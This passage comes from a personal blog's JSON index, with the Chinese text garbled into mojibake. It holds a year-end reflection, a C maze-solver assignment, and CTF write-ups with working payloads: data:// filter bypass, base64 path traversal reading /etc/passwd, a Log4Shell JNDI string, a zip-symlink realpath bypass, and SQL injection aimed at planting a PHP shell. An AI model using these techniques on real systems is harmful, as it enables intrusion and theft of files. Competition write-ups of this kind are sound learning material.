·å­ã€‚\nè¿‡äºä¸§æ°”çš„è¯å°±ä¸å¤šè¯´äº†ï¼Œ2021å¹´è¿˜æ˜¯æ”¶è·é¢‡ä¸°çš„ä¸€å¹´ï¼Œå¼€å¿ƒçš„æ˜¯å­¦åˆ°äº†å¾ˆå¤šå¾ˆå¤šå¥½ç©æœ‰è¶£çš„webå®‰å…¨æ–¹é¢çš„æŠ€æœ¯ï¼Œå…¶æ¬¡åº†å¹¸çš„æ˜¯æˆ‘è‡ªè®¤ä¸ºæ‰¾åˆ°äº†ä¸Šè¿°å›°æ‰°æˆ‘çš„é—®é¢˜çš„ä¸€äº›åŸå› ã€‚æœ‰æ—¶å€™æˆ‘æ€»æ˜¯è¿‡äºçœ‹é‡ä¸€æ®µæ—¶é—´çš„å­¦ä¹ æˆæœè€Œå¿½è§†äº†å­¦ä¹ æ˜¯ä¸€ä¸ªé•¿æœŸç§¯ç´¯çš„è¿‡ç¨‹ï¼Œå­¦ä¹ ä¸åº”è¯¥æ˜¯æŸç§â€œå¿«æ¶ˆå“â€ï¼Œè€Œæ˜¯ä¸€ä¸ªé•¿æœŸä¹ƒè‡³ç»ˆèº«çš„äº‹ä¸šï¼Œä¸åº”è¯¥æŠŠçœ¼å…‰å±€é™äºæŸä¸€ä¸ªé˜¶æ®µè€ŒæŠŠè‡ªå·±å›°è¿›å»ã€‚\nå¾ˆå¤šæ—¶å€™è‡ªå·±ä¹Ÿä¼šé™·å…¥æ— æ„ä¹‰çš„å†…è€—å’Œè‡ªæˆ‘çº ç»“ä¸­ï¼Œä¹‹åçœ‹åˆ°è¿™å¥è¯ï¼šçŸ¥ä¹‹æ„ˆæ˜ï¼Œåˆ™è¡Œä¹‹æ„ˆç¬ƒï¼›è¡Œä¹‹æ„ˆç¬ƒï¼Œåˆ™çŸ¥ä¹‹ç›Šæ˜ã€‚ ä¹Ÿå°±æœ‰ç‚¹æ˜ç™½è¿‡æ¥äº†ã€‚\n2022å¹´å¸Œæœ›èƒ½å¤šæ‰“æ¯”èµ›ï¼Œè¿›çº¿ä¸‹ï¼Œå­¦æ›´å¤šæ›´å¤šæ›´å¤šçš„çŸ¥è¯†ï¼Œåœ¨åŒ—äº¬æ‰¾ä¸€ä»½å®ä¹ å·¥ä½œï¼ˆå°ç›®æ ‡ï¼‰ï¼Œä¹Ÿå¸Œæœ›èƒ½ä¿æŒå¹³ç¨³çš„å¿ƒæ€ï¼Œå¤šçœ‹ä¹¦ï¼Œæ¯å¤©ç•™ç»™è‡ªå·±æ€è€ƒæ”¾ç©ºçš„æ—¶é—´ï¼Œä¸è¦è¢«é«˜é€Ÿçš„ç”Ÿæ´»æ‰€è£¹æŒŸï¼›å¸Œæœ›æ¯ä¸€å¤©éƒ½è¿‡çš„å……å®ä¸°å¯Œã€‚\nå¥½å›°å¥½å›°ï¼Œä¸å¤šbbï¼Œ4å·åˆ°12å·è¦è€ƒ6é—¨ï¼Œå¸Œæœ›æˆ‘èƒ½æ´»ç€å›å®¶ã€‚\nâ€”â€”â€”â€”æƒ³åˆ°äº†å°±è¡¥å……ä¸€ç‚¹ï¼šä¸€èˆ¬çš„å¹´åº¦æ€»ç»“éƒ½è¦ç»™2022å®šå­¦ä¹ è®¡åˆ’ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸å†™äº†ï¼ˆä¸»è¦æ˜¯å¤ªèœäº†å†™å‡ºæ¥ä¸¢äººï¼Œæºœäº†æºœäº†ï¼‰\n","date":"2022-01-02T20:08:38+08:00","permalink":"https://amiaaaz.github.io/life/2021-short-summary/","section":"life","tags":[],"title":"2021å°ç»“"},{"categories":[],"contents":"#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;conio.h\u0026gt; #define MAZESIZE 15 typedef struct ElemType{ int row; int col; int direction; } PosType; typedef struct { PosType pos; struct StackNode *next; } StackNode; typedef struct { StackNode *top; int stacksize; } LinkStack; char maze[MAZESIZE][MAZESIZE]; int FLAG = 1; void gotoxy(int x, int y); void InitMaze(); void DrawMaze(); bool InitStack(LinkStack **stack); bool isEmpty(LinkStack *stack); bool Push(LinkStack *stack, PosType e); bool Pop(LinkStack *stack, PosType *e); bool Pass(PosType curpos); bool Mark(PosType curpos); bool FindPath(PosType start, PosType end); PosType NextPos(PosType curpos); void gotoxy(int x,int y){ HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE); //GetStdHandleå‡½æ•°è·å–ä¸€ä¸ªæŒ‡å‘ç‰¹å®šæ ‡å‡†è®¾å¤‡çš„å¥æŸ„ï¼ŒåŒ…æ‹¬æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯; STD_OUTPUT_HANDLEæ­£æ˜¯ä»£è¡¨æ ‡å‡†è¾“å‡ºï¼ˆä¹Ÿå°±æ˜¯æ˜¾ç¤ºå±ï¼‰çš„å® COORD pos; pos.X = x; pos.Y = y; SetConsoleCursorPosition(handle,pos); } void InitMaze(){ time_t t; srand((unsigned)time(\u0026amp;t)); system(\u0026#34;cls\u0026#34;); for (int i = 0; i \u0026lt;= MAZESIZE - 1; i++){ for (int j = 0; j \u0026lt;= MAZESIZE - 1;j++){ if (i==0 || j==0 || i==MAZESIZE-1 || j==MAZESIZE-1){ maze[i][j] = \u0026#39;#\u0026#39;; }else if((((rand()%13+1) == i) || ((rand()%13+1) == j)) \u0026amp;\u0026amp; !(i==1 \u0026amp;\u0026amp; j==1) \u0026amp;\u0026amp; !(i==MAZESIZE-2 \u0026amp;\u0026amp; j==MAZESIZE-2)){ maze[i][j] = \u0026#39;#\u0026#39;; }else{ maze[i][j] = \u0026#39; \u0026#39;; } } } printf(\u0026#34;[*] init the maze success!\u0026#34;); } void DrawMaze() { for (int i = 0;i \u0026lt; MAZESIZE;i++){ printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;\\t\u0026#34;); for (int j = 0;j \u0026lt; MAZESIZE;j++){ printf(\u0026#34;%c \u0026#34;, maze[i][j]); } } } bool InitStack(LinkStack **stack){ *stack = (LinkStack *)malloc(sizeof(LinkStack)); // æ³¨æ„è¦ç»™é“¾æ ˆåˆ†é…å†…å­˜ (*stack)-\u0026gt;top = NULL; // é“¾æ ˆçš„ç©ºå…¶å®å°±æ˜¯ top=NULL çš„æ—¶å€™ (*stack)-\u0026gt;stacksize = 0; return true; } bool isEmpty(LinkStack *stack){ return stack-\u0026gt;stacksize == 0 ? true : false; } bool Push(LinkStack *stack, PosType e){ StackNode *s = (StackNode *)malloc(sizeof(StackNode)); s-\u0026gt;pos = e; s-\u0026gt;next = stack-\u0026gt;top; // æŠŠå½“å‰çš„æ ˆé¡¶å…ƒç´ èµ‹å€¼ç»™æ–°ç»“ç‚¹çš„ç›´æ¥åç»§ stack-\u0026gt;top = s; // å°†æ–°çš„ç»“ç‚¹sèµ‹å€¼ç»™æ ˆé¡¶æŒ‡é’ˆ stack-\u0026gt;stacksize++; return true; } bool Pop(LinkStack *stack, PosType *e){ StackNode *p; if (isEmpty(stack)) return false; *e = stack-\u0026gt;top-\u0026gt;pos; p = stack-\u0026gt;top; // pç”¨æ¥å­˜å‚¨è¦åˆ é™¤çš„æ ˆé¡¶ç»“ç‚¹ stack-\u0026gt;top = stack-\u0026gt;top-\u0026gt;next; // ä½¿å¾—æ ˆé¡¶æŒ‡é’ˆä¸‹ç§»ä¸€ä½ï¼ŒæŒ‡å‘åä¸€ç»“ç‚¹ free(p); // é‡Šæ”¾ç»“ç‚¹p stack-\u0026gt;stacksize--; return true; } bool Pass(PosType curpos){ if(maze[curpos.row][curpos.col] == \u0026#39; \u0026#39;){ return true; } return false; } bool Mark(PosType curpos){ maze[curpos.row][curpos.col] = \u0026#39;@\u0026#39;; return true; } bool FindPath(PosType start, PosType end){ LinkStack *stack; int curstep = 1; PosType curpos; curpos = start; if (InitStack(\u0026amp;stack)) printf(\u0026#34;\\n[*] int the stack success!\\n\u0026#34;); printf(\u0026#34;[*] Start!\\n\u0026#34;, start.row, start.col); do{ if(Pass(curpos)){ Mark(curpos); curpos.direction = 1; Push(stack, curpos); gotoxy(0,0); DrawMaze(); Sleep(500); if(curpos.row == end.row \u0026amp;\u0026amp; curpos.col == end.col){ printf(\u0026#34;\\n\\n\\n\\n\\n\\n[*] reach the end: (%d, %d)\\n\u0026#34;, curpos.row, curpos.col); return true; } curpos = NextPos(curpos); curstep++; printf(\u0026#34;\\n\\n[+] step: %d\u0026#34;, curstep); printf(\u0026#34; -\u0026gt; (%d, %d)\u0026#34;, curpos.row, curpos.col); }else{ if(!isEmpty(stack)){ Pop(stack, \u0026amp;curpos); while(curpos.direction == 4 \u0026amp;\u0026amp; !isEmpty(stack)){ Mark(curpos); Pop(stack, \u0026amp;curpos); curstep--; gotoxy(0, 0); DrawMaze(); printf(\u0026#34;\\n\\n\\n[-] back to (%d, %d)\u0026#34;, curpos.row, curpos.col); } if(curpos.direction \u0026lt; 4){ curpos.direction++; Push(stack, curpos); curpos = NextPos(curpos); } } } } while (!isEmpty(stack)); printf(\u0026#34;\\n\\n[!] sorry, can\u0026#39;t find the path to end!\\n\u0026#34;); return false; } PosType NextPos(PosType curpos){ switch(curpos.direction){ case 1: curpos.col++; break; case 2: curpos.row++; break; case 3: curpos.col--; break; case 4: curpos.row--; break; } return curpos; } int main() { LinkStack *stack; PosType Start, End; char f; Start.row = 1; Start.col = 1; End.row = 13; End.col = 13; SetConsoleTitleA(\u0026#34;Let\u0026#39;s_Play_Mazes!\u0026#34;); system(\u0026#34;color 3E\u0026#34;); system(\u0026#34;mode con cols=45 lines=35\u0026#34;); do{ InitMaze(); DrawMaze(); FindPath(Start, End); printf(\u0026#34;\\n\\n\\n\\n\\n\\n\\n\\n[*] another game? (y or n)\\n\u0026#34;); f = getchar(); if(f==\u0026#39;n\u0026#39;) FLAG = 0; else if(f == \u0026#39;y\u0026#39;){ system(\u0026#34;cls\u0026#34;); } } while (FLAG); getchar(); return 0; } ä½¿ç”¨vscodeç¼–å†™ï¼Œè¿è¡Œç»“æœ\nå†¬å¤©ä¹Ÿè¿‡å»äº†ï¼Œè¯¥å·äº†\nï¼ˆæ—©è¯¥å·å·äº†ï¼\nå¦å¤–ä¸€äº›è¯è¯´ç»™è‡ªå·±ï¼š\nï¼ˆå½“ç„¶ä¸å¯èƒ½å†™å‡ºæ¥çš„ï¼bakaï¼\n","date":"2021-12-30T13:09:58+08:00","permalink":"https://amiaaaz.github.io/2021/12/30/linkstack-in-maze-question/","section":"posts","tags":[],"title":"æ•°æ®ç»“æ„ä½œä¸šâ€”â€”é“¾æ ˆ\u0026è¿·å®«æ±‚è§£"},{"categories":["CTF"],"contents":"https://ctf.show/challenges\nwebç­¾åˆ° ä¸€çœ¼flaskï¼Œç®€å•fuzzä¸€ä¸‹å‘ç°è¿‡æ»¤äº†å­—æ¯ æ–œæ  å¼•å· æ³¨é‡Šç¬¦ èŠ±æ‹¬å· ç™¾åˆ†å· ç‚¹å·\næ²¡è¿‡æ»¤çš„è¿˜æœ‰æ‹¬å·å’ŒåŠ å‡ä¹˜é™¤\nA: 114)+(0 B: 1 C: -1 ä¸€è¡Œä»£ç  \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-11-18 21:25:22 # @Last Modified by: h1xa # @Last Modified time: 2021-11-18 22:14:12 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ echo !(!(include \u0026#34;flag.php\u0026#34;)||(!error_reporting(0))||stripos($_GET[\u0026#39;filename\u0026#39;],\u0026#39;.\u0026#39;)||($_GET[\u0026#39;id\u0026#39;]!=0)||(strlen($_GET[\u0026#39;content\u0026#39;])\u0026lt;=7)||(!eregi(\u0026#34;ctfsho\u0026#34;.substr($_GET[\u0026#39;content\u0026#39;],0,1),\u0026#34;ctfshow\u0026#34;))||substr($_GET[\u0026#39;content\u0026#39;],0,1)==\u0026#39;w\u0026#39;||(file_get_contents($_GET[\u0026#39;filename\u0026#39;],\u0026#39;r\u0026#39;) !== \u0026#34;welcome2ctfshow\u0026#34;))?$flag:str_repeat(highlight_file(__FILE__), 0); ç°åœ¨éƒ½çˆ±è¿™ç§ä¸€è¡Œæµäº†ï¼Ÿ\næ•´ä½“æ˜¯ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦‚æœå‰é¢çš„è¡¨è¾¾å¼æ•´ä½“ä¸ºçœŸåˆ™è¿”å›$flagï¼Œè€Œå¤–é¢åˆå¥—äº†!()ï¼Œæ‰€ä»¥éœ€è¦æ‹¬å·å†…éƒ¨ä¸ºå‡ï¼Œè€Œåˆéƒ½æ˜¯||è¿æ¥ï¼Œæ‰€ä»¥éœ€è¦æ¯ä¸ªå°æ‹¬å·è‡ªå·±éƒ½ä¸ºå‡ï¼ŒæŒ¨ä¸ªçœ‹çœ‹\n$_GET['id']!=0 ç»™idèµ‹å€¼ä¸º0æˆ–è€…ç›´æ¥ç•™ç©º\nstrlen($_GET['content'])\u0026lt;=7 contenté•¿äº7\n!eregi(\u0026quot;ctfsho\u0026quot;.substr($_GET['content'],0,1),\u0026quot;ctfshow\u0026quot;) æ²¡åŒ¹é…ä¸ºå‡ï¼Œåˆ™åŒ¹é…ä¸ºçœŸï¼Œcontent=wwwwwww\nsubstr($_GET['content'],0,1)=='w' æŠŠcontentæ”¹ä¸ªå¤§å†™\nfile_get_contents($_GET['filename'],'r') !== \u0026quot;welcome2ctfshow\u0026quot; ç”¨data://ä¼ªåè®®\npayload\n?id=0\u0026amp;content=Wwwwwwww\u0026amp;filename=data://text/plain,welcome2ctfshow é»‘å®¢ç½‘ç«™ æºç æç¤º flagä¸åœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šï¼Œä¸ç”¨æ‰«æï¼Œä¸ç”¨æ¸—é€\nçœ‹å­—ç¬¦ä¸²æœ«å°¾æœ‰onionï¼Œæ‹¼åœ¨ä¸€èµ·\nhttp://tyros4qws3mmbubgjqje46ncv35jaqjgeb3nqiuf23ijoj4zwasxohyd.onion è®¿é—®å°±è¡Œäº†æ~\n***ç™»é™†ä¸äº† åœ¨éªŒè¯ç çš„åœ°æ–¹æœ‰ä¸ªå‚æ•°ï¼Œå°è¯•æ–‡ä»¶åŒ…å«\nhttp://bf986069-fc4e-42a3-b09b-c966f9e17a3c.challenge.ctf.show/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d é›€é£Ÿæœ‰/etc/passwdï¼Œä½†æ˜¯çœ‹ä¸äº†/flagï¼Œçœ‹ä¸€ä¸‹åˆ«çš„ä¸œè¥¿\n# /root/.bash_history /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vcm9vdC8uYmFzaF9oaXN0b3J5 å¥½å§ï¼Œç«Ÿç„¶æ˜¯javaï¼Œå…ˆçˆ¬äº†\n","date":"2021-12-28T20:06:48+08:00","permalink":"https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/","section":"posts","tags":["wp"],"title":"CTFshow1221æ‘†çƒ‚æ¯ Wp"},{"categories":["CTF"],"contents":"https://2021.ctf.link/internal/challenges\nLog 4 sanity check ALARM ALARM\nnc 65.108.176.77 1337\nçœ‹åˆ°log4jçš„ç¬¬ä¸€ååº”æ˜¯æ‹¿JNDIé‚£ä¸ªå·¥å…·ç›´æ¥æ¢­ï¼Œä½†æ˜¯å‘ç°å¼¹ä¸å‡ºæ¥shellï¼ˆä¸ç®¡æ˜¯bash ncè¿˜æ˜¯curl wgetè¿™äº› å°è¯•äº†å‘ç°éƒ½ä¸è¡Œï¼‰ï¼Œä½†æ˜¯æ˜¾ç„¶éœ€è¦ä¸€ä¸ªrceæˆ–è€…æ˜¯æ–‡ä»¶è¯»å–çš„ç‚¹ï¼Œå†ä»”ç»†çœ‹dockerfileå‘ç°flagå·²ç»è¢«è¯»åˆ°ç¯å¢ƒå˜é‡ä¸­äº†\nå””ï¼Œæ‰€ä»¥ç›´æ¥è¯»ä¸€ä¸‹æœ¬åœ°ç¯å¢ƒå˜é‡ä¸­çš„flag\n${jndi:ldap://127.0.0.1/${env:FLAG}} hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}\nunzipper Here, let me unzip that for you.\nhttp://65.108.176.76:8200/\nindex.php\n\u0026lt;?php session_start() or die(\u0026#39;session_start\u0026#39;); $_SESSION[\u0026#39;sandbox\u0026#39;] ??= bin2hex(random_bytes(16)); $sandbox = \u0026#39;data/\u0026#39; . $_SESSION[\u0026#39;sandbox\u0026#39;]; $lock = fopen($sandbox . \u0026#39;.lock\u0026#39;, \u0026#39;w\u0026#39;) or die(\u0026#39;fopen\u0026#39;); flock($lock, LOCK_EX | LOCK_NB) or die(\u0026#39;flock\u0026#39;); @mkdir($sandbox, 0700); chdir($sandbox) or die(\u0026#39;chdir\u0026#39;); if (isset($_FILES[\u0026#39;file\u0026#39;])) system(\u0026#39;ulimit -v 8192 \u0026amp;\u0026amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . \u0026#39; . escapeshellarg($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])); else if (isset($_GET[\u0026#39;file\u0026#39;])) if (0 === preg_match(\u0026#39;/(^$|flag)/i\u0026#39;, realpath($_GET[\u0026#39;file\u0026#39;]) ?: \u0026#39;\u0026#39;)) readfile($_GET[\u0026#39;file\u0026#39;]); fclose($lock); çœ‹åˆ°zipæƒ³åˆ°è‚¯å®šè·Ÿè½¯é“¾æ¥è¯»æ–‡ä»¶æœ‰å…³ï¼ˆä½†æ˜¯è¿™ç§å§¿åŠ¿æ²¡æœ‰è§è¿‡ï¼Œå­¦åˆ°äº†\nè¿™é‡Œå®ç°äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œé¦–å…ˆæ˜¯unzip POSTä¸Šä¼ çš„zipæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯å¯¹GETçš„fileå‚æ•°è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå¹¶ä¸”å¯¹å‚æ•°è¿›è¡Œäº†realpath()çš„å¤„ç†ï¼Œå®ƒä¼šè§£æè½¯é“¾æ¥çš„è·¯å¾„ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…è¦æ±‚ä¸èƒ½æœ‰flagï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰ï¼Œä¹‹åå¯ä»¥é€šè¿‡readfile()è¯»æ–‡ä»¶ï¼Œå‚æ•°æ˜¯ä¸ç»è¿‡æ»¤çš„file\nreadfileæœ‰ä¸€ä¸ªç‰¹æ€§æ˜¯æ¥å—urlè·¯å¾„çš„å‚æ•°ï¼Œæ¯”å¦‚file:///flag.txtï¼Œä¼šå°†å…¶è§†ä½œurlå»è¯»å–/flag.txtï¼Œè€Œrealpathä¼šå°†å…¶è§†ä½œfile:æ–‡ä»¶å¤¹ä¸‹çš„flag.txtæ–‡ä»¶\næˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªæŒ‡å‘file:æ–‡ä»¶å¤¹ä¸­çš„xyzï¼ˆä»»æ„æ–‡ä»¶ï¼‰çš„åä¸ºflag.txtçš„è½¯é“¾æ¥ï¼Œå®ƒåœ¨realpathæ—¶è¢«æ‰©å±•ä¸º...../file:/xyz å¯ä»¥é€šè¿‡ifæ¯”è¾ƒï¼Œè€Œåœ¨readfileä¸­åˆ™ä¼šæŒ‰ç…§urlçš„æ–¹å¼è¿›è¡Œè§£æï¼ˆè·Ÿä»€ä¹ˆè½¯é“¾æ¥å°±æ²¡å…³ç³»äº†ï¼‰ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„flag.txt\nmkdir file: cd file: touch amiz.txt ln -s amiz.txt flag.txt cd .. zip -ry tttttemp.zip file: hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}\nå‚è€ƒï¼šwp\nshitty blog Please use my shitty blog ğŸ¤!\nhttp://65.108.176.96:8888/\n\u0026lt;?php // TODO: fully implement multi-user / guest feature :( $secret = \u0026#39;SECRET_PLACEHOLDER\u0026#39;; $salt = \u0026#39;$6$\u0026#39;.substr(hash_hmac(\u0026#39;md5\u0026#39;, $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], $secret), 16).\u0026#39;$\u0026#39;; if(! isset($_COOKIE[\u0026#39;session\u0026#39;])){ $id = random_int(1, PHP_INT_MAX); $mac = substr(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $id, $secret, true), $salt), 20); } else { $session = explode(\u0026#39;|\u0026#39;, $_COOKIE[\u0026#39;session\u0026#39;]); if( ! hash_equals(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $session[0], $secret, true), $salt), $salt.$session[1])) { exit(); } $id = $session[0]; $mac = $session[1]; } setcookie(\u0026#39;session\u0026#39;, $id.\u0026#39;|\u0026#39;.$mac); $sandbox = \u0026#39;./data/\u0026#39;.md5($salt.\u0026#39;|\u0026#39;.$id.\u0026#39;|\u0026#39;.$mac); if(! is_dir($sandbox)) { mkdir($sandbox); } $db = new PDO(\u0026#39;sqlite:\u0026#39;.realpath($sandbox).\u0026#39;/blog.sqlite3\u0026#39;); $db-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); $db-\u0026gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $schema = \u0026#34; CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY, name VARCHAR(255)); CREATE TABLE IF NOT EXISTS entry (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, content TEXT); INSERT OR IGNORE INTO user (id, name) VALUES (0, \u0026#39;System\u0026#39;); INSERT OR IGNORE INTO entry (id, user_id, content) VALUES (0, 0, \u0026#39;Welcome to your new blog - ğŸš©ğŸš©ğŸš© Ê•â€¢Ìá´¥â€¢Ì€Ê”ã£ğŸ¤ ğŸš©ğŸš©ğŸš©\u0026#39;); \u0026#34;; $db-\u0026gt;exec($schema); function get_entries($db){ $sth = $db-\u0026gt;query(\u0026#39;SELECT id, user_id, content FROM entry ORDER BY id DESC\u0026#39;); return $sth-\u0026gt;fetchAll(); } function get_user($db, $user_id) : string { foreach($db-\u0026gt;query(\u0026#34;SELECT name FROM user WHERE id = {$user_id}\u0026#34;) as $user) { return $user[\u0026#39;name\u0026#39;]; } return \u0026#39;me\u0026#39;; } function insert_entry($db, $content, $user_id) { $sth = $db-\u0026gt;prepare(\u0026#39;INSERT INTO entry (content, user_id) VALUES (?, ?)\u0026#39;); $sth-\u0026gt;execute([$content, $user_id]); } function delete_entry($db, $entry_id, $user_id) { $db-\u0026gt;exec(\u0026#34;DELETE from entry WHERE {$user_id} \u0026lt;\u0026gt; 0 AND id = {$entry_id}\u0026#34;); } if(isset($_POST[\u0026#39;content\u0026#39;])) { insert_entry($db, htmlspecialchars($_POST[\u0026#39;content\u0026#39;]), $id); header(\u0026#39;Location: /\u0026#39;); exit; } $entries = get_entries($db); if(isset($_POST[\u0026#39;delete\u0026#39;])) { foreach($entries as $key =\u0026gt; $entry) { if($_POST[\u0026#39;delete\u0026#39;] === $entry[\u0026#39;id\u0026#39;]){ delete_entry($db, $entry[\u0026#39;id\u0026#39;], $entry[\u0026#39;user_id\u0026#39;]); break; } } header(\u0026#39;Location: /\u0026#39;); exit; } foreach($entries as $key =\u0026gt; $entry) { $entries[$key][\u0026#39;user\u0026#39;] = get_user($db, $entry[\u0026#39;user_id\u0026#39;]); } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;My shitty Blog\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/favicon.png\u0026#34;/\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;My shitty blog\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;textarea cols=\u0026#34;50\u0026#34; rows=\u0026#34;10\u0026#34; name=\u0026#34;content\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Post\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php foreach($entries as $entry):?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?= $entry[\u0026#39;content\u0026#39;] ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;small\u0026gt;By \u0026lt;?= $entry[\u0026#39;user\u0026#39;] ?\u0026gt; \u0026lt;/small\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;delete\u0026#34; value=\u0026#34;\u0026lt;?= $entry[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php endforeach ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä½¿ç”¨sqliteåšæ•°æ®åº“ï¼Œéæ¨¡æ‹Ÿé¢„å¤„ç†ï¼Œå¦å¤–å¾ˆå‘çˆ¹çš„æŠŠæ¯ä¸€æ¬¡çš„è¯·æ±‚çš„è®¾ç½®äº†header('Location: /');å¯¼è‡´æ²¡æœ‰å›æ˜¾ï¼ˆå¯¼è‡´è™½ç„¶å®ƒå¼€å¯äº†æŠ¥é”™çš„é€‰é¡¹ ä½†æ˜¯æŠŠå¸¸è§„çš„æŠ¥é”™æ³¨å…¥ç»™æ¯™æ‰äº†ï¼‰\né¦–å…ˆä»å‡ ä¸ªæ•°æ®åº“å‡½æ•°ä¸­æ‰¾æ˜¯å¦æœ‰å¯ä»¥æ³¨å…¥çš„ç‚¹ï¼Œget_entriesæ— è¾“å…¥å€¼ç”¨ä¸äº†ï¼Œinsert_entryç”¨äº†prepareé¢„å¤„ç†\nå‰©ä¸‹çš„get_userå’Œdelete_entryæœ‰æ˜æ˜¾çš„sqlè¯­å¥æ‹¼æ¥ï¼ˆæ— è¿‡æ»¤ï¼‰ï¼Œå°è¯•åˆ©ç”¨delete_entryçš„$user_idè¿›è¡Œsqlæ³¨å…¥ï¼Œè€Œdockerfileä¸­è®¾ç½®äº†flag.txtçš„æƒé™ï¼Œæˆ‘ä»¬åªèƒ½rceæ¥æ‰§è¡Œ/readflagï¼Œæ‰€ä»¥æ³¨å…¥ä¸æ˜¯æ³¨æ•°æ®è€Œæ˜¯åº”è¯¥æ³¨ä¸€ä¸ªç±»ä¼¼\u0026lt;?php echo system('/readflag');?\u0026gt;è¿™æ ·çš„shellè¿›å»ï¼ˆå…·ä½“æ“ä½œåœ¨åé¢\nè€Œè¿™é‡Œçš„$user_idæˆ‘ä»¬å¯ä»¥é€šè¿‡postå†deleteæ¥é€šè¿‡sessionä¸­çš„$idæ¥æ§åˆ¶ï¼Œè¿”å›ä»£ç ä¸­åº·åº·sessionéƒ¨åˆ†çš„å†…å®¹\næ˜¯æ²™ç®±å¼çš„sqliteæ•°æ®åº“ï¼Œé‰´æƒéƒ¨åˆ†ä½¿ç”¨cookie+å¤æ‚çš„ä¸€å †åŠ ç›å“ˆå¸Œå‡½æ•°\nä¸ºäº†é€šè¿‡\nhash_equals(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $session[0], $secret, true), $salt), $salt.$session[1]) çš„ifæ ¡éªŒï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸€ä¸ªåˆç†çš„sessionå€¼ ç±»ä¼¼$id.'|'.$macè¿™æ ·\n$id = random_int(1, PHP_INT_MAX); $mac = substr(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $id, $secret, true), $salt), 20); ä½†æ˜¯æ—¢ä¸çŸ¥é“secretä¹Ÿä¸çŸ¥é“saltâ€”â€”äºæ˜¯æ¯”èµ›çš„æ—¶å€™å°±å¡åˆ°äº†è¿™é‡Œï¼Œä½†æ˜¯å®é™…ä¸Šè¿™é‡Œæ˜¯å¯ä»¥çªç ´çš„\næ³¨æ„crypt()çš„trueå‚æ•°ï¼Œå®ƒä¼šä½¿è¾“å‡ºå€¼æ˜¯raw binary dataï¼Œä¹Ÿå°±æ˜¯è¯´å‘ç”Ÿè¿™ç§ç°è±¡\n$a = \u0026#34;aaaaaaa\u0026#34;; $b = \u0026#34;aaaaaaa\\x00aaaaa\u0026#34;; echo crypt($a, \u0026#39;$2a$07$usesomesillystringforsalt$\u0026#39;); echo crypt($b, \u0026#39;$2a$07$usesomesillystringforsalt$\u0026#39;); æ²¡é”™ï¼æ˜¯ç†Ÿæ‚‰çš„é…æ–¹â€”â€”00æˆªæ–­ï¼Œ\\x00ä¹‹åçš„å†…å®¹å°†è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹ä»»ä½•$idmd5ä¹‹åä»¥\\x00å¼€å¤´çš„å€¼è¿›è¡Œcrypt()ä¹‹åå¾—åˆ°çš„$macæ˜¯ä¸€æ 